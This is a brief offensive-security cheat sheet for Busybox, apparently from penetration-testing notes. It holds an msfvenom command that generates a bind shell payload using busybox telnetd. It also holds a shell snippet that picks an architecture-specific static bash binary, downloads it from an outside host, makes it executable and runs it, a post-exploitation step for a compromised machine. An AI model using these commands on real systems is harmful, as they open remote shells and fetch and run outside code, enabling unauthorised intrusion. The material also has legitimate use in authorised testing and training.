# Busybox

## 01 - Generate Payloads

```
$ msfvenom -p cmd/unix/bind_busybox_telnetd lport=<PORT>
```

## 02 - Download Bash

```sh
URL="https://bin.pkgforge.dev/$(uname -m)/bash"
[ "$(uname -m)" == i686 ] && URL='https://github.com/polaco1782/linux-static-binaries/raw/refs/heads/master/x86-i686/bash'
curl -obash -SsfL "${URL}" && chmod 700 bash && ./bash --version && exec ./bash -il
```